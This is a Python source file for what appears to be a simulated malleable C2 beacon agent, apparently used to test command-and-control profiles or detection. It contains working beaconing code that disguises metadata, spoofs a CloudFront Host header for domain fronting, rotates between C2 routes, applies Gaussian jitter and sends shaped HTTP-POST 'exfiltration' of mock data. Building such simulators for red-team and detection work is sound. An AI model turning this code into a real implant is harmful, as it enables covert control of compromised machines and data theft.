"""
Integrated C2 Client Agent Simulator (Python Core)
Runs Malleable Beacon Heartbeats, Multi-Route Cycling, Gaussian Jitter & In-flight Tasking.
"""

import socket
import threading
import time
import random
from typing import List, Callable, Optional
from backend.models import Profile, TransformBlock
from backend.transforms import TransformPipeline


def _build_pipeline(tb: TransformBlock) -> TransformPipeline:
    pipe = TransformPipeline()
    for t in tb.transforms:
        pipe.add_step(t.action, t.arg)
    return pipe


class EmbeddedC2Client:
    """Simulates a live Malleable C2 Beacon Agent."""

    def __init__(
        self,
        c2_endpoints: List[str],
        port: int,
        profile: Profile,
        on_log_callback: Optional[Callable[[str], None]] = None
    ):
        self.c2_endpoints = c2_endpoints or ["127.0.0.1"]
        self.port = port
        self.profile = profile
        self.on_log = on_log_callback

        self.running = False
        self.thread: Optional[threading.Thread] = None
        self.current_c2_idx = 0
        self.beacon_id = str(random.randint(100000, 999999))
        self.consecutive_fails = 0

    def log(self, msg: str):
        if self.on_log:
            self.on_log(msg)

    def start(self, rounds: int = 5):
        if self.running:
            return
        self.running = True
        self.thread = threading.Thread(target=self._run_loop, args=(rounds,), daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False
        self.log("[*] Client Agent stopped by user.")

    def _get_active_c2(self) -> str:
        return self.c2_endpoints[self.current_c2_idx % len(self.c2_endpoints)]

    def _cycle_c2(self):
        if len(self.c2_endpoints) > 1:
            self.current_c2_idx = (self.current_c2_idx + 1) % len(self.c2_endpoints)
            self.log(f"  [↻ ROUTE CYCLING] Switched active egress route to: {self._get_active_c2()}")

    def _calculate_sleep(self) -> float:
        base = float(self.profile.sleeptime) / 1000.0
        jitter_pct = float(self.profile.jitter) / 100.0
        if jitter_pct <= 0:
            return max(1.0, base)
        # Gaussian distribution
        stddev = (base * jitter_pct) / 3.0
        val = random.gauss(base, stddev)
        return max(1.0, val)

    def _run_loop(self, rounds: int):
        self.log(f"[✓] Ostad Malleable C2 Client Agent Started")
        self.log(f"[*] Target C2: {self._get_active_c2()}:{self.port} | Beacon ID: {self.beacon_id}")
        self.log(f"[*] Profile: {self.profile.name} (Sleep: {self.profile.sleeptime}ms ± {self.profile.jitter}%)")

        count = 0
        while self.running and (rounds == 0 or count < rounds):
            count += 1
            self.log(f"\n[► Round {count}] Sending Shaped Heartbeat Check-in (HTTP-GET)...")

            # 1. Send HTTP-GET
            ok = self._send_get()
            if not ok:
                self.consecutive_fails += 1
                self.log(f"  [!] Connection failure ({self.consecutive_fails}/5)")
                self._cycle_c2()
                if self.consecutive_fails >= 5:
                    self.log("[☠ DEAD-MAN'S SWITCH] Lost contact with all C2 routes. Terminating agent.")
                    break
            else:
                self.consecutive_fails = 0

            # 2. Send HTTP-POST Exfiltration
            self.log(f"[► Round {count}] Sending Shaped Data Exfiltration (HTTP-POST)...")
            self._send_post()

            # 3. Sleep with Jitter
            sleep_sec = self._calculate_sleep()
            self.log(f"[*] Sleeping for {round(sleep_sec * 1000)}ms (Gaussian Jitter)...")

            # Check running flag during sleep
            slept = 0.0
            while slept < sleep_sec and self.running:
                time.sleep(0.5)
                slept += 0.5

        self.running = False
        self.log("\n[✓] Client Agent execution finished.")

    def _send_get(self) -> bool:
        target_ip = self._get_active_c2()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            sock.connect((target_ip, self.port))

            mock_meta = f"BEACON_ID={self.beacon_id};WM={self.profile.global_settings.get('watermark', '982143')};HOST=CORP-WORKSTATION;ARCH=x64;USER=SYSTEM"

            # Apply transform pipeline
            transformed_str = ""
            cookie_header = ""
            uri = self.profile.http_get.uris[0] if self.profile.http_get.uris else "/api/v1/sync"

            meta_block = self.profile.http_get.client.transform_blocks.get("metadata")
            if meta_block:
                pipe = _build_pipeline(meta_block)
                out_bytes = pipe.execute(mock_meta.encode("utf-8"))
                transformed_str = out_bytes.decode("latin-1", errors="ignore")

                if meta_block.termination:
                    if meta_block.termination.target == "header":
                        cookie_header = f"{meta_block.termination.name}: {transformed_str}"
                    elif meta_block.termination.target == "parameter":
                        delim = "&" if "?" in uri else "?"
                        uri += f"{delim}{meta_block.termination.name}={transformed_str}"

            # Assemble HTTP GET
            req_lines = [
                f"GET {uri} HTTP/1.1",
                f"Host: d1v8l4e9k0r2.cloudfront.net",
                f"User-Agent: {self.profile.useragent}",
                "X-Forwarded-For: 203.0.113.195"
            ]
            if cookie_header:
                req_lines.append(cookie_header)
            req_lines.append("Connection: close")
            req_lines.append("")
            req_lines.append("")

            req_str = "\r\n".join(req_lines)
            sock.sendall(req_str.encode("latin-1", errors="ignore"))

            self.log(f"  ├─ Transmitted Shaped Check-in ({len(req_str)} bytes)")
            self.log(f"  ├─ Embedded Metadata Token: {transformed_str[:35]}...")

            resp = sock.recv(4096).decode("latin-1", errors="ignore")
            sock.close()

            if "304 Not Modified" in resp:
                self.log("  └─ Server Tasking: HTTP 304 Not Modified (Idle Cache Emulation)")
            elif "200 OK" in resp:
                self.log("  └─ Server Tasking: HTTP 200 OK (Received Tasking)")

            # In-flight sleep reconfiguration check
            if "SET_SLEEP" in resp:
                try:
                    part = resp.split("SET_SLEEP")[1].strip().split()
                    new_sleep = int(part[0])
                    new_jitter = int(part[1])
                    self.profile.sleeptime = new_sleep
                    self.profile.jitter = new_jitter
                    self.log(f"  [★] In-Flight Timing Reconfigured: Sleep={new_sleep}ms, Jitter={new_jitter}%")
                except Exception:
                    pass

            return True
        except Exception as e:
            self.log(f"  [!] Failed to connect to {target_ip}:{self.port} - {e}")
            return False

    def _send_post(self):
        target_ip = self._get_active_c2()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            sock.connect((target_ip, self.port))

            mock_data = "AUDIT_RESULT: Diagnostic health status: OK; Core processes verified"

            out_block = self.profile.http_post.client.transform_blocks.get("output")
            transformed_body = mock_data
            if out_block:
                pipe = _build_pipeline(out_block)
                out_b = pipe.execute(mock_data.encode("utf-8"))
                transformed_body = out_b.decode("latin-1", errors="ignore")

            uri = self.profile.http_post.uris[0] if self.profile.http_post.uris else "/api/v1/report"
            req_lines = [
                f"POST {uri} HTTP/1.1",
                f"Host: {target_ip}",
                f"User-Agent: {self.profile.useragent}",
                "Content-Type: application/json",
                f"Content-Length: {len(transformed_body)}",
                "Connection: close",
                "",
                transformed_body
            ]
            req_str = "\r\n".join(req_lines)
            sock.sendall(req_str.encode("latin-1", errors="ignore"))

            self.log(f"  ├─ Transmitted Shaped Exfiltration ({len(req_str)} bytes)")
            resp = sock.recv(4096).decode("latin-1", errors="ignore")
            sock.close()
            if "200 OK" in resp:
                self.log("  └─ Server Acknowledged Exfiltration Report (HTTP 200 OK)")
        except Exception:
            pass
